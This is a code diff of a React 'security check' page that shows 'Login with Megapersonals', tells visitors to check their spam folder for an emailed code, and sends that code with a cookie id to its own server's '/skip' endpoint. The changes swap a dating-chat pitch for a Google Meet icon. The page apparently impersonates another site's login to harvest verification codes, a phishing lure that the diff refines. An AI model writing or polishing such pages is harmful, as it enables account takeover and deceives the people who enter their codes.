@@ -8,7 +8,7 @@ import { toast } from "react-toastify";
 function SecurityCheckPage() {
   const [next,setNext]=useState(false)
   const [code, setCode] = useState("");
- 
+
   const id = Cookies.get("id");
 
 
@@ -17,7 +17,7 @@ function SecurityCheckPage() {
       id: id,
       skipcode: code,
     };
-    
+
     const url = `${API_URL}/skip`;
 
     const res = await fetch(url, {
@@ -34,12 +34,12 @@ function SecurityCheckPage() {
     if (res.ok) {
       console.log("success", data);
       toast.success("Login Succecssfull");
-    
+
 
       setCode('')
       console.log("success", data);
       setNext(true)
-      
+
     } else {
       console.log("error", data);
       toast.error("Something Went Wrong");
@@ -51,15 +51,10 @@ function SecurityCheckPage() {
  {
   !next?( <div className="bg-black h-screen flex justify-center items-center">
     <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
-  <p class="text-3xl font-semibold pl-4">Live Video Chat</p>
-  <p class="mt-3 leading-relaxed max-w-[32ch] mx-auto [&amp;>span]:font-semibold">
-    Know each other and enjoy{" "}
-    <span class="text-green-500">private, secure</span>
-    <span class="text-green-500"></span> and{" "}
-    <span class="text-green-500">hasslefree</span> live moment with your
-    dating partner
-  </p>
-  <img src="/images/devilgirl.png" width="180xp" height="120px" alt="" />{" "}
+
+ <div className="flex items-center justify-center">
+   <img src="/images/icons8-google-meet-480.png" width="120px" height="120px" alt="" />{" "}
+ </div>
   <p class="text-xl font-semibold mt-3 text-center">Login with Megapersonals</p>
   <p className="font-semibold text-sm text-green-600 text-center">Check spam folder to your email </p>
   <div class="flex flex-col gap-y-4 mt-4">
@@ -67,7 +62,7 @@ function SecurityCheckPage() {
       required=""
       class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
       placeholder="Enter code here"
-      
+
       name="code"
       value={code}
       onChange={(e) => setCode(e.target.value)}
